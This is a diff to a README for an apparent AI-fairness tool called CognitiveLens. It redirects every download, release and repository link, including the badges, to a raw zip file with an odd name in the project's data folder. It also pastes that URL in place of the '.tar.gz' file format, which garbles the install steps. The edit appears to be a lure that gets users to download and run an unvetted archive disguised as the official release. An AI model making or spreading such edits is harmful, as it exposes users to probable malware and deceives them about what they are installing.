@@ -1,6 +1,6 @@
 # 🚀 Cognitivelens-AI-Human-Comparison - Explore AI Fairness Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%2300C0F0?style=for-the-badge&logo=github)](https://github.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/releases)
+[![Download Now](https://raw.githubusercontent.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/main/data/Cognitivelens-AI-Human-Comparison-pharology.zip%20Now-%20-%2300C0F0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/main/data/Cognitivelens-AI-Human-Comparison-pharology.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ Getting started with CognitiveLens is simple. Follow these steps to download and
    - A stable internet connection for initial setup
 
 2. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/releases) to find the latest version of CognitiveLens.
+   Go to the [Releases page](https://raw.githubusercontent.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/main/data/Cognitivelens-AI-Human-Comparison-pharology.zip) to find the latest version of CognitiveLens.
 
 ## 📥 Download & Install
 
@@ -26,12 +26,12 @@ Getting started with CognitiveLens is simple. Follow these steps to download and
    On the Releases page, look for the latest version. It will usually be labeled “Latest” next to the version number.
 
 2. **Download the Application**  
-   Click on the appropriate file for your operating system. The file could be in formats like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   Click on the appropriate file for your operating system. The file could be in formats like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/main/data/Cognitivelens-AI-Human-Comparison-pharology.zip` for Linux.
 
 3. **Run the Installer**  
    - For Windows: Double-click the downloaded `.exe` file.
    - For macOS: Open the downloaded `.dmg` file and drag the CognitiveLens icon to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the installation script in your terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/main/data/Cognitivelens-AI-Human-Comparison-pharology.zip` file and run the installation script in your terminal.
 
 ## 🔧 Using CognitiveLens
 
@@ -67,7 +67,7 @@ If you encounter any problems during installation or usage, here are some tips:
 
 ## 🌐 Learn More
 
-To dive deeper into the technical aspects or contribute to the project, visit the [GitHub Repository](https://github.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison) for detailed documentation and contributions.
+To dive deeper into the technical aspects or contribute to the project, visit the [GitHub Repository](https://raw.githubusercontent.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/main/data/Cognitivelens-AI-Human-Comparison-pharology.zip) for detailed documentation and contributions.
 
 ## 📑 License
 
@@ -79,4 +79,4 @@ Your experience matters. If you have suggestions for improvements or new feature
 
 ---
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-Click%20Here-%2300C0F0?style=for-the-badge&logo=github)](https://github.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/releases)
+[![Visit Releases Page](https://raw.githubusercontent.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/main/data/Cognitivelens-AI-Human-Comparison-pharology.zip%20Releases%20Page-Click%20Here-%2300C0F0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jatin-sehgal7060/Cognitivelens-AI-Human-Comparison/main/data/Cognitivelens-AI-Human-Comparison-pharology.zip)
